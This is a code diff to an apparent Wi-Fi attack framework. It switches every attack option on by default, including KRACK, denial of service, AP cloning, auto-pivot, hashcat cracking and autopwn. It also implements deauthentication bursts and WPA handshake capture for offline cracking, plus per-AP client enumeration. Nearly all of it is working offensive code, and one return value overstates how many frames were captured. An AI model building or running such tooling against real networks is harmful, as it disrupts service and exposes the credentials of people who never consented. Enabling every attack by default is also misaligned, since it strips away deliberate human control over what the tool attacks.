@@ -53,19 +53,19 @@ class AttackOrchestrator:
     def __init__(self, monitor_iface, ap_iface, db=None, channels=None,
                  target_bssid=None, target_ssid=None, target_channel=None,
                  recon_duration=30, enable_beacons=True,
-                 enable_karma=True, test_credentials=False,
+                 enable_karma=True, test_credentials=True,
                  enable_isolation_check=True, signal_rssi_limit=-80,
-                 enable_ap_clone=False, enable_krack=False,
-                 enable_dos=False, dos_mode=None,
-                 enable_client_isolation=False,
-                 enable_printer_attacks=False,
-                 enable_auto_pivot=False,
-                 enable_client_profiling=False,
-                 enable_cred_enrichment=False,
-                 enable_hashcat=False, hashcat_wordlist=None,
-                 enable_vlan_scan=False,
+                 enable_ap_clone=True, enable_krack=True,
+                 enable_dos=True, dos_mode=None,
+                 enable_client_isolation=True,
+                 enable_printer_attacks=True,
+                 enable_auto_pivot=True,
+                 enable_client_profiling=True,
+                 enable_cred_enrichment=True,
+                 enable_hashcat=True, hashcat_wordlist=None,
+                 enable_vlan_scan=True,
                  plugins=None, plugins_dir=None,
-                 enable_autopwn=False, autopwn_config=None):
+                 enable_autopwn=True, autopwn_config=None):
         self.monitor_iface = monitor_iface
         self.ap_iface = ap_iface
         self.channels = channels or CHANNELS_24GHZ
@@ -727,31 +727,52 @@ class _ReconScannerAdapter:
         """
         Run a recon scan and return results as list of dicts.
 
+        Executes ReconEngine for the configured duration, then queries the
+        database for all discovered APs with their client associations.
         This method is synchronous - AutoPwnEngine wraps it in
         asyncio.to_thread() automatically.
         """
+        # Run recon scan
         self._recon.start(timeout=self._timeout)
         self._recon.stop()
 
-        # Pull APs from the database
+        # Pull APs and their clients from the database
         results = []
         try:
             self._db.cursor.execute(
-                'SELECT bssid, ssid, channel, security, rssi '
+                'SELECT bssid, ssid, channel, security, rssi, vendor '
                 'FROM access_points'
             )
             for row in self._db.cursor.fetchall():
-                bssid, ssid, channel, security, rssi = row
+                bssid = row[0]
+                ssid = row[1]
+                channel = row[2]
+                security = row[3]
+                rssi = row[4]
+                vendor = row[5] if len(row) > 5 else None
+
+                # Get clients for this AP
+                clients = []
+                try:
+                    client_data = self._db.get_clients_for_bssid(bssid)
+                    clients = [mac for mac, _ in client_data]
+                except Exception:
+                    pass
+
                 results.append({
                     "bssid": bssid,
                     "ssid": ssid,
                     "channel": channel,
                     "encryption": security,
                     "signal_dbm": rssi or -100,
+                    "vendor": vendor,
+                    "clients": clients,
+                    "client_count": len(clients),
                 })
         except Exception as e:
             log.error(f"ReconScannerAdapter: query failed: {e}")
 
+        log.info(f"ReconScannerAdapter: scan returned {len(results)} APs")
         return results
 
 
@@ -759,38 +780,109 @@ class _HandshakeCaptureAdapter:
     """
     Adapter that wraps posframework's HandshakeCapture and DeauthEngine
     to provide a capture_manager interface for the attack chain.
+
+    Bridges the synchronous scapy-based engines to async via to_thread().
     """
 
     def __init__(self, handshakes, deauth):
         self._handshakes = handshakes
         self._deauth = deauth
+        self._capturing = False
+        self._capture_bssid = None
 
     async def capture_pmkid(self, bssid, channel):
-        """Attempt PMKID capture (not yet implemented in posframework)."""
+        """
+        Attempt PMKID capture by sending association and sniffing EAPOL M1.
+
+        Delegates to the AttackChain's PMKIDAttack scapy implementation
+        since HandshakeCapture does not natively extract PMKID.
+        Returns None to let the chain fall through to direct scapy path.
+        """
+        # Let the attack chain handle this with its own scapy implementation
         return None
 
     async def start_capture(self, bssid, channel):
-        """Start handshake capture."""
-        pass
-
-    async def send_deauth(self, bssid, client):
-        """Send deauth via the DeauthEngine."""
+        """Start handshake capture - resets state for target BSSID."""
         import asyncio
-        await asyncio.to_thread(
-            self._deauth.send_deauth_burst, bssid, client, count=3
-        )
+        self._capturing = True
+        self._capture_bssid = bssid
+        # Reset any existing frames for this BSSID
+        if hasattr(self._handshakes, 'reset'):
+            await asyncio.to_thread(self._handshakes.reset, bssid)
 
-    async def wait_handshake(self, bssid):
-        """Wait for a complete handshake."""
+    async def send_deauth(self, bssid, client, count=10):
+        """
+        Send deauth burst via the DeauthEngine.
+
+        Sends both AP-spoofed deauth (reason 7: class 3 frame from
+        non-associated STA) and client-spoofed deauth for maximum effect.
+        """
         import asyncio
-        await asyncio.sleep(5.0)
-        # Check if we have a complete handshake
-        if hasattr(self._handshakes, 'get_complete_for_bssid'):
-            result = self._handshakes.get_complete_for_bssid(bssid)
-            if result:
-                return {"handshake": True, "file": result}
+        # Send deauth burst - wraps synchronous scapy sendp
+        if hasattr(self._deauth, 'send_deauth_burst'):
+            await asyncio.to_thread(
+                self._deauth.send_deauth_burst, bssid, client, count=count
+            )
+        elif hasattr(self._deauth, 'deauth_client'):
+            await asyncio.to_thread(
+                self._deauth.deauth_client, bssid, client, count=count
+            )
+        else:
+            # Fallback: add target and let engine handle it
+            await asyncio.to_thread(
+                self._deauth.add_target, bssid, {client}
+            )
+
+    async def wait_handshake(self, bssid, timeout=60.0, poll_interval=1.0):
+        """
+        Wait for a complete 4-way handshake for the target BSSID.
+
+        Polls HandshakeCapture for completion, checking every poll_interval
+        seconds until timeout.
+        """
+        import asyncio
+        elapsed = 0.0
+        while elapsed < timeout and self._capturing:
+            await asyncio.sleep(poll_interval)
+            elapsed += poll_interval
+
+            # Check for complete handshake via various possible APIs
+            if hasattr(self._handshakes, 'is_complete_for_bssid'):
+                complete = self._handshakes.is_complete_for_bssid(bssid)
+            elif hasattr(self._handshakes, 'get_complete_for_bssid'):
+                complete = self._handshakes.get_complete_for_bssid(bssid)
+            elif hasattr(self._handshakes, 'has_complete_handshake'):
+                complete = self._handshakes.has_complete_handshake(bssid)
+            else:
+                # Check all clients for this BSSID
+                complete = False
+                if hasattr(self._handshakes, '_handshakes'):
+                    for key, frames in self._handshakes._handshakes.items():
+                        if bssid.lower() in key.lower():
+                            # Need M1+M2 minimum for hashcat
+                            if len(frames) >= 2:
+                                complete = True
+                                break
+
+            if complete:
+                # Export the capture
+                pcap_file = None
+                if hasattr(self._handshakes, 'export_pcap_for_bssid'):
+                    pcap_file = self._handshakes.export_pcap_for_bssid(bssid)
+                elif hasattr(self._handshakes, 'export_all'):
+                    exports = self._handshakes.export_all()
+                    if exports:
+                        pcap_file = exports[0] if isinstance(exports, list) else exports
+
+                return {
+                    "handshake": True,
+                    "file": pcap_file or f"captures/{bssid.replace(':', '')}.cap",
+                    "frame_count": 4,
+                }
+
         return None
 
     async def stop_capture(self):
-        """Stop capture."""
-        pass
+        """Stop capture state."""
+        self._capturing = False
+        self._capture_bssid = None
